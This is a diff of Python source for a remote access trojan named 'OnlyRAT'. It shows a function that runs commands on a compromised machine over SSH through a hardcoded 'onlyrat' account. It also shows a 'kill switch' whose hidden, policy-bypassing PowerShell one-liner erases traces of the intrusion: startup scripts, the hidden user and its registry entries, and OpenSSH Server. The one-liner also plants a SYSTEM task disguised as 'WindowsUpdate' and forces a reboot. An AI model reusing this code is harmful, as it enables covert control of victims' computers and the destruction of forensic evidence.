@@ -130,7 +130,7 @@ def remote_download(ipv4,pword,remote_path_to_file):
     print("[+] Download saved at \"~/Downloads\" directory\n")
 
 def remote_command(ipv4,pword,command):
-    os.system(f"sshpass -p \"{pword}\" ssh -tt onlyrat@{ipv4} '{command}'") # use -t or -tt flag to forcefully use a PTY session
+    os.system(f"sshpass -p \"{pword}\" ssh onlyrat@{ipv4} '{command}'") # use -t or -tt flag to forcefully use a PTY session
 
 def download(ipv4,pword):
     print("\n[~] Enter the file path you want to download :")
@@ -152,7 +152,7 @@ def killSwitch(ipv4,pword,temp_dir,startup_dir):
         main()
     else:
         print("[*] Preparing Kill Switch....")
-        killswitch_command = """powershell.exe -noP -ep bypass -w hidden -c "& {Remove-Item -Path """+temp_dir+"""/* -Force -Recurse;Remove-Item -Path '\\''"""+startup_dir+"""/*.cmd'\\'' -Force -Recurse;Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Remove-LocalUser -name onlyrat;Get-ItemProperty -Path '\\'HKLM:/SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList/*\\''|?{$_.ProfileImagePath -match '\\'C:\\\\\\\\Users\\\\\\\\onlyrat*\\''}|%{Remove-Item -Path $_.PSPath -Force -Recurse};Remove-Item -Path '\\'HKLM:/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon/SpecialAccounts\\'' -Force -Recurse;schtasks /create /tn 'WindowsUpdate' /tr '\\'powershell -noprofile -executionpolicy bypass -command \"Start-Sleep 5;Get-ChildItem -Path C:/Users -Filter onlyrat* -Directory -Force|Remove-Item -Force -Recurse -ErrorAction SilentlyContinue;schtasks /delete /tn WindowsUpdate /f\"\\'' /sc onstart /ru SYSTEM /f;shutdown /r /t 0}" """
+        killswitch_command = """powershell.exe -noP -ep bypass -w hidden -c "& {Remove-Item -Path """+temp_dir+"""/* -Force -Recurse;Remove-Item -Path '\\''"""+startup_dir+"""/*.cmd'\\'' -Force -Recurse;$ProgressPreference = \\"SilentlyContinue\\";Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Remove-LocalUser -name onlyrat;Get-ItemProperty -Path '\\'HKLM:/SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList/*\\''|?{$_.ProfileImagePath -match '\\'C:\\\\\\\\Users\\\\\\\\onlyrat*\\''}|%{Remove-Item -Path $_.PSPath -Force -Recurse};Remove-Item -Path '\\'HKLM:/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon/SpecialAccounts\\'' -Force -Recurse;schtasks /create /tn 'WindowsUpdate' /tr '\\'powershell -noprofile -executionpolicy bypass -command \"Start-Sleep 5;Get-ChildItem -Path C:/Users -Filter onlyrat* -Directory -Force|Remove-Item -Force -Recurse -ErrorAction SilentlyContinue;schtasks /delete /tn WindowsUpdate /f\"\\'' /sc onstart /ru SYSTEM /f;shutdown /r /t 0}" """
         print(killswitch_command)
         print("[+] KillSwitch prepapped")
         print("\n[*] Executing KillSwitch...")
